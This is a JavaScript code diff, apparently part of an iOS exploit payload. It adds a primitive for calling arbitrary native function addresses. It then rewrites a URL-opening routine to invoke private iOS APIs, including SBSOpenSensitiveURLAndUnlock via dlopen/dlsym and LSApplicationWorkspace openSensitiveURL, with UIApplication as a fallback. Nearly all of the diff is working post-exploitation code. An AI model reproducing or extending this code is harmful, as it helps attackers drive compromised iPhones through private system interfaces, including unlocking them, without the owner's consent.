@@ -109,6 +109,23 @@
       return buff[200];
     }
 
+    static callAddress(addr, x0, x1, x2, x3, x4, x5, x6, x7) {
+      this.#argPtr = this.#argMem;
+      x0 = this.#toNative(x0);
+      x1 = this.#toNative(x1);
+      x2 = this.#toNative(x2);
+      x3 = this.#toNative(x3);
+      x4 = this.#toNative(x4);
+      x5 = this.#toNative(x5);
+      x6 = this.#toNative(x6);
+      x7 = this.#toNative(x7);
+      const ret64 = this.#nativeCallAddr(BigInt(addr || 0n), x0, x1, x2, x3, x4, x5, x6, x7);
+      this.#argPtr = this.#argMem;
+      if (ret64 === 0xffffffffffffffffn) return -1;
+      if (ret64 < 0xffffffffn && ret64 > -0xffffffffn) return Number(ret64);
+      return ret64;
+    }
+
     static callSymbol(name, x0, x1, x2, x3, x4, x5, x6, x7) {
       this.#argPtr = this.#argMem;
       x0 = this.#toNative(x0);
@@ -159,29 +176,130 @@
     } catch (_) {}
   }
 
-  function openDoneUrl() {
-    const UIApplication = Native.callSymbol("objc_getClass", "UIApplication");
+  function emptyOptions() {
+    const NSDictionary = Native.callSymbol("objc_getClass", "NSDictionary");
+    return isNonZero(NSDictionary) ? objc(NSDictionary, "dictionary") : 0n;
+  }
+
+  function makeURL() {
     const NSURL = Native.callSymbol("objc_getClass", "NSURL");
-    if (!isNonZero(UIApplication) || !isNonZero(NSURL)) {
-      log("missing UIApplication/NSURL");
-      return false;
+    if (!isNonZero(NSURL)) {
+      log("missing NSURL");
+      return 0n;
     }
-    const app = objc(UIApplication, "sharedApplication");
     const urlString = cfstr(DONE_URL);
     const url = isNonZero(urlString) ? objc(NSURL, "URLWithString:", urlString) : 0n;
     if (isNonZero(urlString)) Native.callSymbol("CFRelease", urlString);
-    if (!isNonZero(app) || !isNonZero(url)) {
-      log("missing app/url app=" + app + " url=" + url);
+    if (!isNonZero(url)) log("URLWithString failed url=" + DONE_URL);
+    return url;
+  }
+
+  function selectorSupported(obj, selectorName) {
+    if (!isNonZero(obj)) return false;
+    return Number(objc(obj, "respondsToSelector:", sel(selectorName))) !== 0;
+  }
+
+  function trySBS(url) {
+    try {
+      const RTLD_DEFAULT = 0xfffffffffffffffen;
+      const handle = Native.callSymbol("dlopen", "/System/Library/PrivateFrameworks/SpringBoardServices.framework/SpringBoardServices", 1);
+      let openFn = isNonZero(handle) ? Native.callSymbol("dlsym", handle, "SBSOpenSensitiveURLAndUnlock") : 0n;
+      if (!isNonZero(openFn)) openFn = Native.callSymbol("dlsym", RTLD_DEFAULT, "SBSOpenSensitiveURLAndUnlock");
+      if (!isNonZero(openFn)) {
+        log("SBSOpenSensitiveURLAndUnlock unavailable handle=" + handle);
+        return false;
+      }
+      const ret = Native.callAddress(openFn, url, 1n);
+      log("SBSOpenSensitiveURLAndUnlock called ret=" + ret + " handle=" + handle);
+      return true;
+    } catch (e) {
+      log("SBS exception " + String(e));
       return false;
     }
-    const modernSel = sel("openURL:options:completionHandler:");
-    if (Number(objc(app, "respondsToSelector:", modernSel)) !== 0) {
-      objc(app, "openURL:options:completionHandler:", url, 0n, 0n);
-    } else {
-      objc(app, "openURL:", url);
+  }
+
+  function tryUIApplication(url) {
+    try {
+      const UIApplication = Native.callSymbol("objc_getClass", "UIApplication");
+      if (!isNonZero(UIApplication)) {
+        log("missing UIApplication");
+        return false;
+      }
+      const app = objc(UIApplication, "sharedApplication");
+      if (!isNonZero(app)) {
+        log("missing sharedApplication");
+        return false;
+      }
+      let attempted = false;
+      if (selectorSupported(app, "canOpenURL:")) {
+        const canOpen = objc(app, "canOpenURL:", url);
+        log("UIApplication canOpenURL=" + canOpen);
+      }
+      if (selectorSupported(app, "openURL:options:completionHandler:")) {
+        const options = emptyOptions();
+        objc(app, "openURL:options:completionHandler:", url, options, 0n);
+        log("UIApplication openURL:options:completionHandler: called options=" + options);
+        attempted = true;
+      }
+      if (selectorSupported(app, "openURL:")) {
+        objc(app, "openURL:", url);
+        log("UIApplication openURL: called");
+        attempted = true;
+      }
+      if (!attempted) log("UIApplication has no usable openURL selector");
+      return attempted;
+    } catch (e) {
+      log("UIApplication exception " + String(e));
+      return false;
     }
-    log("open requested url=" + DONE_URL);
-    return true;
+  }
+
+  function tryLSWorkspace(url) {
+    try {
+      Native.callSymbol("dlopen", "/System/Library/Frameworks/CoreServices.framework/CoreServices", 1);
+      Native.callSymbol("dlopen", "/System/Library/PrivateFrameworks/MobileCoreServices.framework/MobileCoreServices", 1);
+      const LSApplicationWorkspace = Native.callSymbol("objc_getClass", "LSApplicationWorkspace");
+      if (!isNonZero(LSApplicationWorkspace)) {
+        log("missing LSApplicationWorkspace");
+        return false;
+      }
+      const workspace = objc(LSApplicationWorkspace, "defaultWorkspace");
+      if (!isNonZero(workspace)) {
+        log("missing defaultWorkspace");
+        return false;
+      }
+      const options = emptyOptions();
+      if (selectorSupported(workspace, "openSensitiveURL:withOptions:")) {
+        const ret = objc(workspace, "openSensitiveURL:withOptions:", url, options);
+        log("LSApplicationWorkspace openSensitiveURL ret=" + ret + " options=" + options);
+        return true;
+      }
+      if (selectorSupported(workspace, "openURL:withOptions:")) {
+        const ret = objc(workspace, "openURL:withOptions:", url, options);
+        log("LSApplicationWorkspace openURL:withOptions ret=" + ret + " options=" + options);
+        return true;
+      }
+      if (selectorSupported(workspace, "openURL:")) {
+        const ret = objc(workspace, "openURL:", url);
+        log("LSApplicationWorkspace openURL ret=" + ret);
+        return true;
+      }
+      log("LSApplicationWorkspace has no usable open selector");
+      return false;
+    } catch (e) {
+      log("LSApplicationWorkspace exception " + String(e));
+      return false;
+    }
+  }
+
+  function openDoneUrl() {
+    const url = makeURL();
+    if (!isNonZero(url)) return false;
+    const sbsOk = trySBS(url);
+    const uiOk = tryUIApplication(url);
+    const lsOk = tryLSWorkspace(url);
+    log("open attempts done sbs=" + sbsOk + " ui=" + uiOk + " ls=" + lsOk + " url=" + DONE_URL);
+    return sbsOk || uiOk || lsOk;
   }
 
   function runOnMain() {
